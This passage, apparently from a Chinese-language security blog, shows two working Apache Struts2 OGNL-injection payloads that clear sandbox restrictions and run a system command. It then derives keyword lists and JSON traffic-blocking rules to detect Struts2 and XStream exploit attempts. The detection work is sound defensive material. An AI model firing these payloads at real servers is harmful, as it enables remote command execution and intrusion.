%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}

// 后续对于沙箱绕过做了增黑名单防护，但是紧接着pwntester就绕过了
%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'whoami'}).(#res=#exec.exec(#cmd))}
```

Struts2的漏洞中，除了Xstream反序列化，都是由于Ognl表达式注入造成的。

先分析Ognl表达式注入的特征，根据前面的POC分析可以知道，攻击流量可能会存在如下关键字（为了减少误报，尽量使用全限定名）：

- java.lang.ProcessBuilder
- java.lang.System
- java.lang.Runtime
- org.apache.struts2.ServletActionContext
- com.opensymphony.xwork2.dispatcher.HttpServletResponse
- denyMethodExecution
- _memberAccess
- allowStaticMethodAccess
- excludeProperties
- ognl.OgnlContext
- DEFAULT_MEMBER_ACCESS
- com.opensymphony.xwork2.ActionContext.container
- com.opensymphony.xwork2.ognl.OgnlUtil
- struts.valueStack
- org.apache.tomcat.InstanceManager
- org.apache.commons.collections.BeanMap

然后Xstream反序列化的那个POC的关键字为： `javax.imageio.spi.FilterIterator` ，且其Content-Type必须为application/xml。

针对Ognl表达式注入的整体的流量规则如下：

```json
{
    "id": 19990110,
    "title": "test-struts2-poc",
    "services": [
        {
            "net": "192.168.192.162",
            "port": 8585
        }
    ],
    "action": "reset_client,block_outbound",
    "patterns": [
        {
            "location": [],
            "pattern": "(((\\$|%){)|\\()((\\s|\\S)*?)(java\\.lang\\.ProcessBuilder|java\\.lang\\.System|java\\.lang\\.Runtime|org\\.apache\\.struts2\\.ServletActionContext|com\\.opensymphony\\.xwork2\\.dispatcher\\.HttpServletResponse|denyMethodExecution|_memberAccess|allowStaticMethodAccess|excludeProperties|ognl\\.OgnlContext|DEFAULT_MEMBER_ACCESS|com\\.opensymphony\\.xwork2\\.ActionContext\\.container|com\\.opensymphony\\.xwork2\\.ognl\\.OgnlUtil|struts\\.valueStack|org\\.apache\\.tomcat\\.InstanceManager|org\\.apache\\.commons\\.collections\\.BeanMap)((\\s|\\S)*?)(}|\\))"
        }
    ]
}
```

上述规则中，因为Struts2的攻击payload可能出现如下几个位置：

- URL中
- Content-Type中
- Content-Disposition中
- POST以及GET请求的参数中

所以流量规则的location为就得为 `[]` 。

针对Xstream的流量特征，其Content-Type必须要为 `application/xml` ，且存在 `javax.imageio.spi.FilterIterator` 关键字，所以其流量规则如下：

```json
{
    "id": 19990111,
    "title": "test-struts2-xstream-poc",
    "services": [
        {
            "net": "192.168.192.162",
            "port": 8585
        }
    ],
    "action": "reset_client,block_outbound",
    "patterns": [
        {
            "location": [
                "HEADER:Content-Type"
            ],
            "pattern": "application/xml",
            "encoding": "utf8"
        },
        {
            "location": [],
            "pattern": "javax\\.imageio\\.spi\\.FilterIterator"
        }
    ]
}
```

## 参考

- [https://www.cnblogs.com/oumyye/p/4356149.html](https://www.cnblogs.com/oumyye/p/4356149.html)
- [https://xz.aliyun.com/t/2044](https://xz.aliyun.com/t/2044)
- [https://xz.aliyun.com/t/2323](https://xz.aliyun.com/t/2323)
- [https://mochazz.github.io/2020/06/28/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-003/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90](https://mochazz.github.io/2020/06/28/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-003/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
- [https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%92%8C-%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB](https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%92%8C-%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB)
- [https://paper.seebug.org/1575/](https://paper.seebug.org/1575/)
- [https://www.cnblogs.com/lzh2012/p/5339161.html](https://www.cnblogs.com/lzh2012/p/5339161.html)